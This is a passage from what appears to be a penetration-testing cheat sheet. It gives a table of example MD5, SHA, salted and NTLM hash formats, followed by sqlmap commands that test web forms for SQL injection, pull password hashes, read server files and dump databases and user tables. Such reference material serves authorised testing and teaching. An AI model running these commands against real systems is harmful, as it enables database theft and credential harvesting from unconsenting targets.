      </td>
    </tr>
  </tbody>
</table>
</div>

### Hash Examples

Likely just use **hash-identifier** for this but here are some example hashes:

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Hash</th>
      <th>Example</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>
        <p>MD5 Hash Example</p>
      </td>
      <td>
        <p><code>8743b52063cd84097a65d1633f5c74f5</code></p>
      </td>
    </tr>
    <tr>  
      <td>
        <p>MD5 $PASS:$SALT Example</p>
      </td>
      <td>
        <p><code>01dfae6e5d4d90d9892622325959afbe:7050461</code></p>
      </td>
    </tr>
    <tr>  
      <td>
        <p>MD5 $SALT:$PASS</p>
      </td>
      <td>
        <p><code>f0fda58630310a6dd91a7d8f0a4ceda2:4225637426</code></p>
      </td>
    </tr>
    <tr>  
      <td>
        <p>SHA1 Hash Example</p>
      </td>
      <td>
        <p><code>b89eaac7e61417341b710b727768294d0e6a277b</code></p>
      </td>
    </tr>

    <tr>  
      <td>
        <p>SHA1 $PASS:$SALT</p>
      </td>
      <td>
        <p><code>2fc5a684737ce1bf7b3b239df432416e0dd07357:2014</code></p>
      </td>
    </tr>

    <tr>  
      <td>
        <p>SHA1 $SALT:$PASS</p>
      </td>
      <td>
        <p><code>cac35ec206d868b7d7cb0b55f31d9425b075082b:5363620024</code></p>
      </td>
    </tr>

    <tr>  
      <td>
        <p>SHA-256</p>
      </td>
      <td>
        <p><code>127e6fbfe24a750e72930c220a8e138275656b<br>8e5d8f48a98c3c92df2caba935</code></p>
      </td>
    </tr>

    <tr>  
      <td>
        <p>SHA-256 $PASS:$SALT</p>
      </td>
      <td>
        <p><code>c73d08de890479518ed60cf670d17faa26a4a7<br>1f995c1dcc978165399401a6c4</code></p>
      </td>
    </tr>

    <tr>  
      <td>
        <p>SHA-256 $SALT:$PASS</p>
      </td>
      <td>
        <p><code>eb368a2dfd38b405f014118c7d9747fcc97f4<br>f0ee75c05963cd9da6ee65ef498:560407001617</code></p>
      </td>
    </tr>

    <tr>  
      <td>
        <p>SHA-512</p>
      </td>
      <td>
        <p><code>82a9dda829eb7f8ffe9fbe49e45d47d2dad9<br>664fbb7adf72492e3c81ebd3e29134d9bc<br>12212bf83c6840f10e8246b9db54a4<br>859b7ccd0123d86e5872c1e5082f</code></p>
      </td>
    </tr>

    <tr>  
      <td>
        <p>SHA-512 $PASS:$SALT</p>
      </td>
      <td>
        <p><code>e5c3ede3e49fb86592fb03f471c35ba13e8<br>d89b8ab65142c9a8fdafb635fa2223c24e5<br>558fd9313e8995019dcbec1fb58414<br>6b7bb12685c7765fc8c0d51379fd</code></p>
      </td>
    </tr>

    <tr>  
      <td>
        <p>SHA-512 $SALT:$PASS</p>
      </td>
      <td>
        <p><code>976b451818634a1e2acba682da3fd6ef<br>a72adf8a7a08d7939550c244b237c72c7d4236754<br>4e826c0c83fe5c02f97c0373b6b1<br>386cc794bf0d21d2df01bb9c08a</code></p>
      </td>
    </tr>

    <tr>  
      <td>
        <p>NTLM Hash Example</p>
      </td>
      <td>
        <p><code>b4b9b02e6f09a9bd760f388b67351e2b</code></p>
      </td>
    </tr>

  </tbody>
</table>
</div>

## SQLMap Examples

A mini SQLMap cheat sheet: 

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>
        <p><code>sqlmap -u http://meh.com --forms --batch --crawl=10 <br> --cookie=jsessionid=54321 --level=5 --risk=3</code></p>
      </td>
      <td>
            <p>Automated sqlmap scan</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code> sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE <br> --level=3 --current-user --current-db --passwords <br> --file-read="/var/www/blah.php" </code></p>
      </td>
      <td>
            <p>Targeted sqlmap scan</p>
      </td>
    </tr>


    <tr>
      <td>
        <p><code>sqlmap -u "http://meh.com/meh.php?id=1" <br>--dbms=mysql --tech=U --random-agent --dump </code></p>
      </td>
      <td>
            <p>Scan url for union + error based injection with mysql backend <br>and use a random user agent + database dump</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code>sqlmap -o -u "http://meh.com/form/" --forms</code></p>
      </td>
      <td>
            <p>sqlmap check form for injection</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code>sqlmap -o -u "http://meh/vuln-form" --forms <br> -D database-name -T users --dump</code></p>
      </td>
      <td>
            <p>sqlmap dump and crack hashes for table users on database-name.</p>
      </td>
     </tr>
  </tbody>
</table>
</div>
